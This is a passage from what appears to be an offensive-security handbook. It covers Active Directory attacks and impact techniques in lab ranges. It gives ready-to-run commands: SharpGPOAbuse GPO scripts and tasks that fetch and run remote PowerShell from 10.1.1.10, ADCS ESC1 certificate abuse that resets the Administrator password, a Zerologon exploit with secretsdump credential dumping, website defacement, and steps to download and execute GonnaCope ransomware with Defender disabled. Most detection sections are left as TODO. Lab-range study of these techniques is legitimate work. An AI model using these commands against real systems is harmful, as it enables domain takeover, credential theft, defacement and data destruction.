<pre><code>SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
</code></pre>
<h4 id="indicators-of-compromise-31"><a class="header" href="#indicators-of-compromise-31">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-4---addusertask--addcomputertask"><a class="header" href="#method-4---addusertask--addcomputertask">Method 4 - AddUserTask / AddComputerTask</a></h3>
<p>The following are the available options to add a user or computer task via GPO:</p>
<pre><code>Options required to add a new computer or user immediate task:

--TaskName
        Set the name of the new computer task.
--Author
        Set the author of the new task (use a DA account).
--Command
        Command to execute.
--Arguments
        Arguments passed to the command.
--GPOName
        The name of the vulnerable GPO.

Additional User Task Options:
--FilterEnabled
        Enable Target Filtering for user immediate tasks.
--TargetUsername
        The user to target. The malicious task will run only on the specified user. Should be in the format &lt;DOMAIN&gt;\&lt;USERNAME&gt;
--TargetUserSID
        The targeted user's SID.

Additional Computer Task Options:
--FilterEnabled
        Enable Target Filtering for computer immediate tasks.
--TargetDnsName
        The DNS name of the computer to target. The malicious task will run only on the specified host.
</code></pre>
<p>The following will add a user task, this syntax also works with &quot;--AddComputerTask&quot;:</p>
<pre><code>SharpGPOAbuse.exe --AddUserTask --TaskName &quot;Update&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;
</code></pre>
<h4 id="indicators-of-compromise-32"><a class="header" href="#indicators-of-compromise-32">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-5---addregistrykey"><a class="header" href="#method-5---addregistrykey">Method 5 - AddRegistryKey</a></h3>
<p>The following are the available options to add a registry key via GPO:</p>
<pre><code>Options required to set a registry key:
--KeyPath
        The path to the registry key.
--KeyName
        The name of the registry key.
--KeyType
        The type of data to place into the registry key.
--KeyData
        The data to place into the registry key.
--Hive
        The registry hive to affect, can be HKLM or HCU.
--GPOName
        The name of the vulnerable GPO.
</code></pre>
<p>Currently, only the REG_DWORD key is supported with this tool. Due to restrictions on the GPO, only HKLM and HCU are available as hives.</p>
<p>The following will add a registry key:</p>
<pre><code>SharpGPOAbuse.exe --AddRegistryKey --Hive HKLM --KeyPath &quot;Software\Policies\Microsoft\Windows\Installer&quot; --KeyName AlwaysInstallElevated --KeyType REG_DWORD --KeyData 1 --GPOName &quot;Vulnerable GPO&quot;
</code></pre>
<h4 id="indicators-of-compromise-33"><a class="header" href="#indicators-of-compromise-33">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="certificate-template-abuse"><a class="header" href="#certificate-template-abuse">Certificate Template Abuse</a></h1>
<h2 id="summary-20"><a class="header" href="#summary-20">Summary</a></h2>
<p>Certificate Template Abuse is a technique that can be used to impersonate/take control of any user in a domain given a misconfiguration in certificate templates in the Active Directory Certificate Services (ADCS). To learn more about this technique, please visit <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">this excellent blog post.</a></p>
<h2 id="prerequisites-20"><a class="header" href="#prerequisites-20">Prerequisites</a></h2>
<p>Active Directory with ADCS set up and configured. A certificate template must be created where the enrollee can specify the Subject Alternative Name (SAN), and can authenticate via the template. Further, a non-privileged account or group must be able to enroll into the template and the attacker must have control over that account or group.</p>
<h2 id="setup-20"><a class="header" href="#setup-20">Setup</a></h2>
<p>First, a domain controller must be configured. It is important to <em>NOT</em> install the Certificate Services PRIOR to promoting to a domain controller. Failure to abide by this will prevent you from promoting the server into a domain controller. Thank you Windows! Once &quot;Active Directory Domain Services&quot; has been installed and the server has been promoted, then and only then install &quot;Active Directory Certificate Services&quot; from the &quot;Add Roles and Features&quot; menu.</p>
<p>All of the defaults when adding ADCS to the range are fine. Only the &quot;Certificate Authority&quot; is required, and the setup type of the CA should be set to &quot;Enterprise CA&quot;.</p>
<p><img src="./images/Pasted%20image%2020230719113536.png" alt="image" /></p>
<p>Next, go to Tools -&gt; Certification Authority, and then right click -&gt; Manage on Certificate Templates.</p>
<p><img src="./images/Pasted%20image%2020230719113831.png" alt="image" /></p>
<p>Find a template that has the most features enabled that you want to use, in this case I chose &quot;Workstation Authentication&quot;, and then I duplicated the template.</p>
<p><img src="./images/Pasted%20image%2020230719120516.png" alt="image" /></p>
<p>For ESC1, change the Subject Name to be handled by the enrollee by selecting &quot;Supply in the request&quot;.</p>
<p><img src="./images/Pasted%20image%2020230719114320.png" alt="image" /></p>
<p>To add or remove specific features, modify the Application Policies in the Extensions tab.</p>
<p><img src="./images/Pasted%20image%2020230719114419.png" alt="image" /></p>
<p>To control who can enroll, change the settings in the Security tab.</p>
<p><img src="./images/Pasted%20image%2020230719115833.png" alt="image" /></p>
<p>With the new template created, close the window and then click on &quot;Certificate Templates&quot;, and then go to Action -&gt; New -&gt; Certificate Template to Issue. Select the template that was just created in the following window and click OK.</p>
<p><img src="./images/Pasted%20image%2020230719130337.png" alt="image" /></p>
<p>LDAP needs to have SSL enabled to authenticate using the certificates. Reboot the DC after all of these changes have been made. God fucking help you if LDAPS doesn't work, cause he didn't help me.</p>
<h2 id="execution-20"><a class="header" href="#execution-20">Execution</a></h2>
<h3 id="method-1---esc1"><a class="header" href="#method-1---esc1">Method 1 - ESC1</a></h3>
<p>The first step is to determine if any certificate template is vulnerable. Using the <a href="https://github.com/ly4k/Certipy">certipy</a> utility, run the following command to query the ADCS service:</p>
<pre><code class="language-bash">certipy find -u username -p password -dc-ip &lt;ip&gt;
</code></pre>
<p>The command should product a txt and json file. Use the <code>jq</code> command below to trim out irrelevant details:</p>
<pre><code class="language-bash">jq '.&quot;Certificate Templates&quot; | .[] | select(.Enabled == true) | select(.&quot;[!] Vulnerabilities&quot; != null) | {&quot;Template Name&quot;, &quot;Client Authentication&quot;, &quot;Any Purpose&quot;, &quot;Enrollee Supplies Subject&quot;, &quot;Permissions&quot;, &quot;[!] Vulnerabilities&quot;}' &lt;certipy_output&gt;.json
</code></pre>
<p><img src="./images/Pasted%20image%2020230718150901.png" alt="JQ Output" /></p>
<p>In this case, the &quot;CorpVPN&quot; template can be used in this exploit. It's important to take note of the CA used in the template, underneath the &quot;Certificate Authorities&quot; block.</p>
<p>In this example, the &quot;Domain Computers&quot; group is able to enroll a certificate. If the user under our control has the ability to create a user account, the following command can be used:</p>
<pre><code class="language-bash">addcomputer.py -dc-ip &lt;ip&gt; -computer-pass 'Password123' -computer-name 'ComputerName' 'domain.com/username:password' -computer
-group 'CN=Domain Computers,DC=domain,DC=com'
</code></pre>
<p><img src="./images/Pasted%20image%2020230718145531.png" alt="addcomputer.py" /></p>
<p>Now, using the computer account that was just created, the following certipy command will attempt to abuse the misconfiguration and will return the certifcate and key in a pfx file for the Administrator account:</p>
<pre><code class="language-bash">certipy req -u 'ComputerName$' -p 'Password123' -dc-ip &lt;ip&gt; -ca '&lt;ASSIGNED-CA&gt;' -template 'CorpVPN' -upn 'Administrator'
</code></pre>
<p>If the command times out, repeat several times until the output resembles the following:</p>
<p><img src="./images/Pasted%20image%2020230718145653.png" alt="pfx file" /></p>
<p>Some tools may not be able to handle the pfx file, so the following certipy commands will break it into the certificate and key files:</p>
<pre><code class="language-bash">certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
</code></pre>
<p>Finally, using <a href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">this github repo</a>,  download the &quot;passthecert.py&quot; file to utilize the certificate and key to change the Administrators password:</p>
<pre><code class="language-bash">passthecert.py -action modify_user -target administrator -new-pass 'Pwned!!' -domain 'domain.com' -dc-ip &lt;ip&gt; -crt administrator.crt -key administrator.key
</code></pre>
<p><img src="./images/Pasted%20image%2020230718150333.png" alt="passthecert" /></p>
<p>At this point the Administrator users password should be changed to &quot;Pwned!!&quot;.</p>
<h4 id="indicators-of-compromise-34"><a class="header" href="#indicators-of-compromise-34">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-vulnerabilities"><a class="header" href="#active-directory-vulnerabilities">Active Directory Vulnerabilities</a></h1>
<ul>
<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="zerologon-cve-2020-1472"><a class="header" href="#zerologon-cve-2020-1472">Zerologon (CVE-2020-1472)</a></h1>
<h2 id="summary-21"><a class="header" href="#summary-21">Summary</a></h2>
<p>This vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf. </p>
<h2 id="prerequisites-21"><a class="header" href="#prerequisites-21">Prerequisites</a></h2>
<p>This exploit requires at least one DC to be set up and configured. The DC <em>must</em> not have the patch, i.e. install the DC from before August 11th, 2020, or attempt to delete all of the KB security updates which may not work. <strong>Windows Server 2008 R2 SP1</strong> requires an ESU license for the patch to apply, which is atypical, making this version the ideal target for configuring a range with this vulnerability.</p>
<h2 id="setup-21"><a class="header" href="#setup-21">Setup</a></h2>
<p>If the prerequisites have been met, then any Zerologon exploit should work out of the box.</p>
<h2 id="execution-21"><a class="header" href="#execution-21">Execution</a></h2>
<h3 id="method-1---changing-dcs-machine-account-password"><a class="header" href="#method-1---changing-dcs-machine-account-password">Method 1 - Changing DC's Machine Account Password</a></h3>
<p>Clone the repository at https://github.com/risksense/zerologon, by either downloading the zip file or running the following command:</p>
<pre><code class="language-bash">git clone https://github.com/risksense/zerologon
</code></pre>
<p>If there are any issues, update or reinstall impacket. Then, in the same directory as the cloned repository, run the following command:</p>
<pre><code class="language-bash">python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
</code></pre>
<p>Then, the DC's machine accounts hash is set to <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>. This can be used with impacket's pass-the-hash functionality. I.e. dumping secret:</p>
<pre><code class="language-bash">sudo secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
</code></pre>
<p>To reinstall the old machine password, you must use the Administrator hash you got from secretsdump, and then run secrets dump again using that hash:</p>
<pre><code>sudo secretsdump.py -hashes :&lt;Administrator NTLM Hash&gt; 'DOMAIN/Administrator@dc_ip_addr'
</code></pre>
<p>This will give you much more output than before, and this will also give you the old machine account hash:</p>
<p><img src="./images/Pasted%20image%2020230629110911.png" alt="image" /></p>
<pre><code class="language-bash">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
</code></pre>
<h4 id="indicators-of-compromise-35"><a class="header" href="#indicators-of-compromise-35">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="impact"><a class="header" href="#impact">Impact</a></h1>
<ul>
<li><a href="./website_defacement.html">Website Defacement</a></li>
<li><a href="./gonnacope_(ransomware).html">GonnaCope</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="website-defacement"><a class="header" href="#website-defacement">Website Defacement</a></h1>
<h2 id="summary-22"><a class="header" href="#summary-22">Summary</a></h2>
<p>Website defacement is a destructive and loud method of denying or humiliating a service or company. In this case, the website will be replaced with a &quot;King of the Hill&quot; themed propane selling service.</p>
<h2 id="prerequisites-22"><a class="header" href="#prerequisites-22">Prerequisites</a></h2>
<p>The target webserver must support PHP in order to host the defaced webroot contents.</p>
<h2 id="setup-22"><a class="header" href="#setup-22">Setup</a></h2>
<p>Download <a href="./misc-attachments/papa_www.zip">this</a> file, it contains the contents to be placed in the targets webroot. Often times this is in /var/www/html, but check the running webservers config file to verify.</p>
<h2 id="execution-22"><a class="header" href="#execution-22">Execution</a></h2>
<h3 id="method-1---extract-using-unzip"><a class="header" href="#method-1---extract-using-unzip">Method 1 - Extract using Unzip</a></h3>
<p>To upload the file to the machine, one possible way is to use <code>scp</code> or to host a python webserver and then use <code>wget</code> on the target webserver. Prior to extracting, either delete or move the contents of the old webroot. Then, once the file is uploaded, its time to locate and enter the webroot of the server, then run the following command:</p>
<pre><code class="language-bash">cd /var/www/html # Most common webroot location
unzip /path/to/papa_www.zip
</code></pre>
<h4 id="indicators-of-compromise-36"><a class="header" href="#indicators-of-compromise-36">Indicators of Compromise</a></h4>
<p>TODO, but its going to be loud and obvious</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gonnacope"><a class="header" href="#gonnacope">GonnaCope</a></h1>
<h2 id="summary-23"><a class="header" href="#summary-23">Summary</a></h2>
<p>The GonnaCope Ransomware is among the more harmful ransomware threats. It is capable of locking the data of its victims completely. Furthermore, thanks to the sufficient strength of the encryption algorithm, the affected files are unlikely to ever be restored without assistance from the attackers.</p>
<h2 id="prerequisites-23"><a class="header" href="#prerequisites-23">Prerequisites</a></h2>
<ul>
<li>Administrator with high integrity or NT/Authority System shell.</li>
<li>Defender disabled or definitions deleted.</li>
</ul>
<h2 id="setup-23"><a class="header" href="#setup-23">Setup</a></h2>
<p>Download the 7z Compressed ransomware from <a href="https://github.com/vxunderground/MalwareSourceCode/tree/main/Win32/Ransomware">here.</a> The password is 'infected' without the single quotes. 
Place the ransomware onto the system via download or GPO.</p>
<h2 id="execution-23"><a class="header" href="#execution-23">Execution</a></h2>
<h3 id="method-1---execution-via-command-prompt-or-rdp-session"><a class="header" href="#method-1---execution-via-command-prompt-or-rdp-session">Method 1 - Execution via command prompt or RDP session.</a></h3>
<p>Within the shell type:</p>
<pre><code class="language-powershell">.\G0nnaC0pe.bat
</code></pre>
<p>OR</p>
<p>Navigate to the directory of the ransomware and double click the <code>G0nnaC0pe.bat</code> file.</p>
<h4 id="indicators-of-compromise-37"><a class="header" href="#indicators-of-compromise-37">Indicators of Compromise</a></h4>
<ul>
<li>
<p>The ransomware encrypts files found and adds a &quot;.cope&quot; extension to the filename.</p>
</li>
<li>
<p>The mouse buttons are inverted</p>
</li>
<li>
<p>The ransomware spawns the below shell:</p>
</li>
</ul>
<p><img src="./images/Pasted%20image%2020230606110703.png" alt="gonnacope" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="contributors"><a class="header" href="#contributors">Contributors</a></h1>
<p>Thank you for checking out our website! This project serves to be the culmination of all our knowledge regarding cybersecurity. See the <a href="https://github.com/nukingdragons/hacknum-opus">associated github page</a>.</p>
<p>This project is led and maintained by:</p>
<ul>
<li><a href="https://github.com/nukingdragons">Sabrina Andersen (NukingDragons)</a></li>
<li><a href="https://github.com/Drone-spec">Patrick Jenkins (Drone)</a></li>
<li><a href="https://github.com/mesumine">Thomas Wells (mesumine)</a></li>
<li><a href="https://github.com/numonce">Jonathan Brown (numonce)</a></li>
<li><a href="https://github.com/tylerdotrar">Tyler McCann (tylerdotrar)</a></li>
<li><a href="https://github.com/NoahKirchner">Noah Kirchner (Noah Kirchner)</a></li>
<li><a href="https://github.com/shinspace92">Minwoo Shin (shinspace92)</a></li>
<li><a href="https://github.com/Skyfa117">Ava Hughes (Skyfa117)</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                        
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                            </nav>

        </div>

        
        
        
                <script>
            window.playground_copyable = true;
        </script>
        
        
                <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>
        
        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->
        
                        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
                
    </div>
    </body>
</html>
